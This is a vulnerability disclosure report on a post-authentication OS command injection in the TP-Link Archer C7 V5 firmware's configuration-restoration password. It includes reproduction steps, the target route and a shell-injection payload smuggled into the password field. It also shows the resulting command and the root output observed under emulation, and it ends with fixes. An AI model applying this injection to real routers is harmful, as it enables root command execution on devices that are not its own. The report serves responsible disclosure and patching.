## SECTION 1 – Reporter Information

Reporter Name / Handle:
Lumina

Email Address:
1547800591@qq.com

## SECTION 2 – Vulnerability Overview

Vulnerability Name:
Archer C7 V5 Configuration Restoration Password OS Command Injection

Brief Description:
The configuration-restoration function in the tested Archer C7 V5 firmware contains an OS command injection vulnerability (CWE-78). An attacker with a valid administrator session can supply a crafted restoration password. After RSA decryption, the password is concatenated into a shell command without shell-metacharacter filtering and executed through `/bin/sh -c`.

The vulnerable code constructs a command of the form `echo -n <decrypted-password> | openssl dgst -sha512`. RSA encryption protects the password in transit but does not make the decrypted value safe for shell interpretation. Shell separators in the decrypted value therefore change the command structure before the uploaded backup is authenticated.

This is a post-authentication vulnerability. 

Affected Product(s) / Module / Component:
TP-Link Archer C7; Web management service (`uhttpd` and LuCI), `/www/cgi-bin/luci`; configuration-restoration handler in `/usr/lib/lua/luci/controller/admin/firmware.lua`; shell wrapper in `/usr/lib/lua/luci/model/subprocess.lua`.

Vulnerable request:
`POST /cgi-bin/luci/;stok=<token>/admin/firmware?form=config_replace`

Firmware Version:
1.3.1 Build 20260821 (`20260821-rel41256`)

Original firmware filename:
`c7v5_us-up-ver1-3-1-P1[20260821-rel41256]_2026-08-21_11.49.18.bin`

Original firmware SHA-256:
`e67f2ab65182b69faa008e46966d281904c2ff25c4e1cfee28600a591e0a6bce`

Decrypted firmware SHA-256:
Not applicable. The tested image was unpacked without a separate firmware-decryption step.

Hardware Version:
V5

Tested Device Country Code:
The firmware filename identifies the US image (`c7v5_us`). 

![image-20261106110440931](Archer_C7_V5_Config_Recovery_Password_Command_Injection_Report_EN.assets/image-20261106110440931.png)

## SECTION 3 – Discovery Context

Date Discovered:
2026-11-06

Environment (LAN/WAN/App/etc.):
Web management interface over HTTP. Testing was performed in an isolated local emulation environment. 

Devices Used:
- Windows analysis host used for source review and report generation.
- Ubuntu IoT analysis VM at `192.168.135.132`.
- Extracted Archer C7 firmware running with `qemu-mips-static` (MIPS32 big-endian user-mode emulation) in a chroot.
- The firmware's actual `uhttpd`, LuCI controllers, and backend modules were run together on TCP port 8080.

Tools Used:
binwalk, unblob, `unsquashfs`, Lua 5.1 bytecode decompilation tooling, QEMU, Python 3, Requests, Python Cryptography, curl, and standard shell utilities.

Additional Context:
Exploitation requires a valid administrator session. The route also processes request content through its real file handler to create `/tmp/config.bin` before password handling. The PoC sends content through that handler and prepares the associated encrypted-backup test material.

For user-mode emulation only, targeted compatibility changes were made in the separate `useremul/rootfs` tree: `sauth.sane` and `checktypes.check_safe_request` were adjusted, the CGI interpreter launcher was adapted for QEMU, a test administrator session was inserted, and the hardware-dependent `nvrammanager` was disabled. 

Evidence level: VALIDATED in user-mode emulation, based on a successful request to the real route and creation of a device-side marker containing attacker-selected output. 

## SECTION 4 – Technical Details

Reproduction Steps:
1. Start the firmware's `uhttpd` and LuCI backend on TCP port 8080 in the prepared user-mode emulation environment.
2. Run `validate_config_backup_rce.py` as root on the analysis VM. The script prepares the emulation and encrypted-backup test input, creates a test administrator session, and sends the request using the firmware's expected encrypted and signed Web protocol.
3. The decrypted business request selects `operation=backup`. Its RSA-encrypted `password` field decrypts to `x;p=/tmp/tp_backup_rce;echo TP_BACKUP_RCE>$p;id>>$p;#`.
4. Observe HTTP 200 and verify that `/tmp/tp_backup_rce` inside the emulated firmware contains `TP_BACKUP_RCE`. The file is visible from the VM host at `useremul/rootfs/tmp/tp_backup_rce`.
5. For a repeat test, remove the previous marker or let the PoC remove it before sending the request. An old marker must not be treated as new evidence.

Proof of Concept (PoC):
The attached `validate_config_backup_rce.py` script implements the proof of concept and constructs the required RSA/AES/signature fields. It uses the existing local-emulation environment and is not a standalone Internet-facing exploit.

Run on the analysis VM:

```bash
cd /home/iotsec-zone/Desktop/archer_c7_v5_1_3_1
sudo python3 validate_config_backup_rce.py
sudo cat useremul/rootfs/tmp/tp_backup_rce
```

Tested route and logical request fields:

```http
POST /cgi-bin/luci/;stok=<test-admin-token>/admin/firmware?form=config_replace HTTP/1.1
Host: 127.0.0.1:8080
Cookie: sysauth=<test-admin-session>
Content-Type: application/x-www-form-urlencoded

sign=<request-signature>&data=<encrypted-request-data>
```

The decrypted request data has the following structure:

```text
operation=backup&password=<RSA-encryption-of-the-payload>&
```

Decrypted password payload:

```sh
x;p=/tmp/tp_backup_rce;echo TP_BACKUP_RCE>$p;id>>$p;#
```

Resulting shell command:

```sh
echo -n x;p=/tmp/tp_backup_rce;echo TP_BACKUP_RCE>$p;id>>$p;# | openssl dgst -sha512
```

Observed result:

```text
HTTP status: 200
marker: TP_BACKUP_RCE
uid=0(root) gid=0(root) groups=0(root)
VALIDATED: authenticated command injection reached the real admin/firmware route
```

The RSA and AES values are intentionally generated for the current test session and use randomized padding, so a fixed transport ciphertext is not a reliable repeat-test vector. The attached PoC generates the complete request rather than omitting those protocol steps.

![image-20261106110615150](Archer_C7_V5_Config_Recovery_Password_Command_Injection_Report_EN.assets/image-20261106110615150.png)

Technical source-to-sink chain:
1. In `firmware_index`, the `form=config_replace` branch reads the HTTP `password` form value and passes it to the local restoration function (`analysis/lua-src/luci/controller/admin/firmware.lua:2825-2835`; function begins at line 2571).
2. The restoration function RSA-decrypts that value and passes the plaintext to the configuration-check function (`analysis/lua-src/luci/controller/admin/firmware.lua:2130-2171`).
3. The configuration-check function calls the SHA-512 helper with the decrypted password before validating the uploaded configuration HMAC (`analysis/lua-src/luci/controller/admin/firmware.lua:1994-2010`). Thus, a subsequently rejected backup does not prevent the injected command from running.
4. The SHA-512 helper directly concatenates the plaintext into `echo -n <password> | openssl dgst -sha512` and passes it to `call_output_shell` (`analysis/lua-src/luci/controller/admin/firmware.lua:1949-1958`).
5. `call_output_shell` builds an argument vector whose command string is the attacker-influenced value and invokes `/bin/sh -c` (`analysis/lua-src/luci/model/subprocess.lua:323-337`).
6. In the payload, the first semicolon terminates `echo -n x`, `p` stores the marker path, `echo` writes the marker, and `id>>$p` appends the command's `uid/gid` output. The final `#` comments out the fixed OpenSSL pipeline suffix. The 53-byte payload fits one RSA plaintext chunk in this test.

Expected Behavior:
The restoration password should be treated exclusively as binary or text input to a cryptographic operation. It should never alter command syntax. Configuration authentication should complete before any unsafe processing, and no password value should be evaluated by a shell.

Actual Behavior:
A crafted, RSA-encrypted password is decrypted and inserted unquoted into a shell command. A valid administrator session can therefore execute an arbitrary shell command before backup HMAC validation. The demonstration produced HTTP 200 and a marker containing `TP_BACKUP_RCE`, confirming command execution rather than inferring it from source code or an HTTP status alone.

Potential Exploitation Scenarios:
A malicious administrator, or an attacker who has obtained a valid administrator session, can execute commands with the Web backend's privileges when the restoration function is reachable. This can modify configuration and files or invoke available system utilities.

## SECTION 5 – Suggested Fix

Recommended Fix or Mitigation:
1. Remove `/bin/sh -c` from password hashing and backup-processing paths. Use an OpenSSL library or a direct process API with a fixed argument array and the password supplied through a safe input channel.
2. Do not construct pipelines with string concatenation for cryptographic operations. Pass input through a deliberately managed standard-input pipe without invoking a command interpreter.
3. Enforce a strict password length and permitted-character policy as defense in depth, including rejection of control characters and shell metacharacters; do not rely on RSA decryption as input validation.
4. Audit all related SHA-512, HMAC, encryption, and restoration helpers for the same pattern. Fixing only the demonstrated request handler is insufficient if shared helpers remain unsafe.
5. Keep administrator-session protection, CSRF defenses, and request-signature checks enabled. These controls reduce exposure but do not replace safe command construction.
6. Add a regression test using a payload such as the marker above and verify that no command is executed and no marker is created.

## SECTION 6 – Attachments

Linked Files:
1. [`validate_config_backup_rce.py`](validate_config_backup_rce.py) — reproducible local-emulation PoC; constructs the encrypted and signed request and checks the marker.
